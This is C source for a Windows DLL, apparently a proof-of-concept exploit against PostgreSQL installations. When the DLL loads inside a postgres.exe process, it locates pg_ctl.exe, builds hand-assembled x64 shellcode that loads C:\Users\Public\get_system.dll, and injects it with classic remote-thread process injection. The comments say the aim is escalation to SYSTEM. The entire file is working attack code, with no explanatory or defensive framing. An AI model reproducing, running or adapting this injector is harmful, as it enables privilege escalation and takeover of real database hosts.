// "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
// cl.exe /D_USRDLL /D_WINDLL /MT /Tc pg_inject.c /link /DLL /out:pg_inject.dll /SUBSYSTEM:WINDOWS /MACHINE:x64

#include "dll.h"
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib,"user32.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"advapi32.lib")

typedef unsigned __int64 QWORD;
HANDLE log_file = NULL;
DWORD bytes_written = 0;
BOOL out_verbose = TRUE;

void message_log(const char * line)
{
	if(out_verbose) WriteFile(log_file,line,strlen(line),&bytes_written, NULL);
}

DWORD Getprocess_idByName(const char* processName) {
    PROCESSENTRY32 pe32;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    do {
        if (strcmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}
// this is the most standard process injection on Windows
void process_inject(DWORD process_id, LPVOID buffer, SIZE_T size_of_the_buffer) {
    HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if (!process_handle) {
        message_log("Could not open the target process.\n");
		printf("ERRNO: %d",GetLastError());
        return;
    }
    LPVOID addr_in_target = VirtualAllocEx(process_handle,NULL,size_of_the_buffer,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if (!addr_in_target) {
        message_log("Could not allocate memory in the target process.\n");
        CloseHandle(process_handle);
        return;
    }
    SIZE_T bytes_written;
    if (!WriteProcessMemory(process_handle, addr_in_target, buffer, size_of_the_buffer, &bytes_written)) {
        message_log("Failed to write to the target process memory.\n");
        VirtualFreeEx(process_handle, addr_in_target, 0, MEM_RELEASE);
        CloseHandle(process_handle);
        return;
    }
    DWORD old_protect_flags;
    if (!VirtualProtectEx(process_handle, addr_in_target, size_of_the_buffer, PAGE_EXECUTE_READ, &old_protect_flags)) {
        message_log("Failed to change the memory protection flag.\n");
        VirtualFreeEx(process_handle, addr_in_target, 0, MEM_RELEASE);
        CloseHandle(process_handle);
        return;
    }
    HANDLE thread_handle = CreateRemoteThread(process_handle,NULL,0,(LPTHREAD_START_ROUTINE)addr_in_target,NULL,0,NULL);
    if (!thread_handle) {
        message_log("Failed to create the remote thread.\n");
        VirtualFreeEx(process_handle, addr_in_target, 0, MEM_RELEASE);
        CloseHandle(process_handle);
        return;
    }
	message_log("Remote thread successully created in the target process!\n");
    WaitForSingleObject(thread_handle,INFINITE);
	message_log("Remote thread finished execution. Closing handles and releasing the memory.\n");
    CloseHandle(thread_handle);
    VirtualFreeEx(process_handle, addr_in_target, 0, MEM_RELEASE);
    CloseHandle(process_handle);
	message_log("All done.\n");
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if(ul_reason_for_call != DLL_PROCESS_ATTACH) return 0; // only execute this once, during process attach (we don't want this to run twice)
	if(out_verbose)
	{
		log_file = CreateFileA("C:\\Users\\Public\\postgres_poc_log.txt", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // create the log
		if (log_file != INVALID_HANDLE_VALUE)
		{
			SetFilePointer(log_file, 0, NULL, FILE_END);
		}
	}

	// first, obtain the PID of the pg_ctl.exe process, because that's where we have to inject our shellcode, as we are currently in one of the postgres.exe processes, which all have weak primary tokens that do not hold SeImpersonate privilege and thus won't allow us to escalate to SYSTEM
    DWORD pid = Getprocess_idByName("pg_ctl.exe");
    if (!pid) {		
        message_log("Process not found.\n");
		if(out_verbose) CloseHandle(log_file);
        return 1;
    }
	else
	{
		char msg[100];
		snprintf(msg,sizeof(msg),"PID found: %d\n",pid);
		message_log(msg);		

		HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
		if (!hKernel32) {
			message_log("Failed to load kernel32.dll\n");
			return 1;
		}		
		LPVOID load_library_pointer = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
		if (!load_library_pointer) {
			message_log("Could not obtain the address of LoadLibraryA()\n");
			FreeLibrary(hKernel32);
			return 1;
		}
		memset(msg,0,sizeof(msg));
		snprintf(msg,sizeof(msg),"The current address of LoadLibraryA(): %p\n",load_library_pointer);
		message_log(msg);

		LPVOID exit_thread_pointer = (LPVOID)GetProcAddress(hKernel32, "ExitThread");
		if (!exit_thread_pointer) {
			message_log("Failed to get the address of ExitThread\n");			
		}
		memset(msg,0,sizeof(msg));
		snprintf(msg,sizeof(msg),"Address of ExitThread() function: %p\n",exit_thread_pointer);
		message_log(msg);		
		FreeLibrary(hKernel32);

		// first, we have a mov $ADDR,%eax instruction, where $ADDR is the dynamically imprinted address of LoadLIbraryA(), so we can eventually call %rax
		// then we have a series of push instructions that push the full path to the DLL onto the stack, now it's C:\Users\Public\get_system.dll (the alignment of instructions changes depending on the length of the string)
		BYTE loadlibrary_shellcode[] = { 
			0x48,0xba,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,	// movabs the dynamically fetched address (00s are just a placeholder) of LoadLibraryA into RDX
			0x48,0xb8,0x65,0x6d,0x2e,0x64,0x6c,0x6c,0x00,0x00,	// movabs $0x00006c6c642e6d65,%rax (copy 'em.dll\0\0' to RAX)
			0x50,						// push %rax (push it on the stack)
			0x48,0xb8,0x67,0x65,0x74,0x5f,0x73,0x79,0x73,0x74,	// movabs $0x747379735f746567,%rax (copy 'get_syst' to RAX)
			0x50,						// push %rax (push it on the stack)
			0x48,0xb8,0x5c,0x50,0x75,0x62,0x6c,0x69,0x63,0x5c,	// movabs $0x5c63696c6275505c,%rax (copy '\Public\' to RAX)
			0x50,						// push %rax (push it on the stack)
			0x48,0xb8,0x43,0x3a,0x5c,0x55,0x73,0x65,0x72,0x73,	// movabs $0x73726573555c3a43,%rax (copy 'C:\Users' to RAX)
			0x50,						// push %rax (push it on the stack)
			0x48,0x89,0xe1,				// mov %rsp,%rcx
			0x48,0x83,0xEC,0x28,		// sub $0x28,%rsp
			0xff,0xd2,					// call *%rdx (call LoadLibraryA())
			0x33,0xc0,					// xor %eax,%eax
			0x48,0x83,0xC4,0x28,		// add $0x28,%rsp
		}; 
		BYTE exit_thread[] = {
			0x48,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // movabs $0x0,%rax (placeholder for ExitThread)
			0x48,0xb9,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // movabs $0x0,%rcx
			0xff,0xd0 // call *%rax
		};
		BYTE final_shellcode[1024];
		memset(final_shellcode,0,sizeof(final_shellcode));
		
		// now, let's write the LoadLibraryA() pointer into the shellcode (movabs $ADDR,%rax instruction)
		QWORD ptrAsUint = (QWORD)load_library_pointer;
		char * ptr = (char*)&ptrAsUint;
		loadlibrary_shellcode[2]=ptr[0];  // we fill 00s (which are just placeholders) with the actual bytes of the address
		loadlibrary_shellcode[3]=ptr[1];
		loadlibrary_shellcode[4]=ptr[2];
		loadlibrary_shellcode[5]=ptr[3];
		loadlibrary_shellcode[6]=ptr[4];
		loadlibrary_shellcode[7]=ptr[5];
		loadlibrary_shellcode[8]=ptr[6];
		loadlibrary_shellcode[9]=ptr[7];
		
		// now, let's write the ExitThread() pointer into the shellcode (mov $ADDR,%eax instruction)
		ptrAsUint = (QWORD)exit_thread_pointer;
		ptr = (char*)&ptrAsUint;		
		exit_thread[2]=ptr[0]; // we fill 00s (which are just placeholders) with the actual bytes of the address
		exit_thread[3]=ptr[1];
		exit_thread[4]=ptr[2];
		exit_thread[5]=ptr[3];
		exit_thread[6]=ptr[4];
		exit_thread[7]=ptr[5];
		exit_thread[8]=ptr[6];
		exit_thread[9]=ptr[7];
		
		// for debugging purposes, we might want to write this buffer out
		memset(msg,0,sizeof(msg));
		snprintf(msg,sizeof(msg),"First 10 bytes of the loadlibrary shellcode now: %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x\n",loadlibrary_shellcode[0],loadlibrary_shellcode[1],loadlibrary_shellcode[2],loadlibrary_shellcode[3],loadlibrary_shellcode[4],loadlibrary_shellcode[5],loadlibrary_shellcode[6],loadlibrary_shellcode[7],loadlibrary_shellcode[8],loadlibrary_shellcode[9]); 
		message_log(msg);
		memset(msg,0,sizeof(msg));
		snprintf(msg,sizeof(msg),"First 10 bytes of exit_thread shellcode now: %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x\n",exit_thread[0],exit_thread[1],exit_thread[2],exit_thread[3],exit_thread[4],exit_thread[5],exit_thread[6],exit_thread[7],exit_thread[8],exit_thread[9]); // 
		message_log(msg);		
		
		// concatenate loadlibrary_shellcode and exit_thread
		memcpy(final_shellcode,loadlibrary_shellcode,sizeof(loadlibrary_shellcode));
		memcpy(final_shellcode+sizeof(loadlibrary_shellcode),exit_thread,sizeof(exit_thread));
		SIZE_T size_of_the_buffer = sizeof(loadlibrary_shellcode)+sizeof(exit_thread);
		
		if(out_verbose) 
		{			
			// write the shellcode into a file instead
			HANDLE shellcode_file = CreateFileA("C:\\users\\Public\\shellcode.dump", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // create 
			// for now, instead of injecting the shellcode, write in into a file
			WriteFile(shellcode_file,final_shellcode,size_of_the_buffer,&bytes_written, NULL);
			CloseHandle(shellcode_file);
		}				
		process_inject(pid, final_shellcode, size_of_the_buffer);
		if(out_verbose) CloseHandle(log_file);	
	}
    return 0;
}
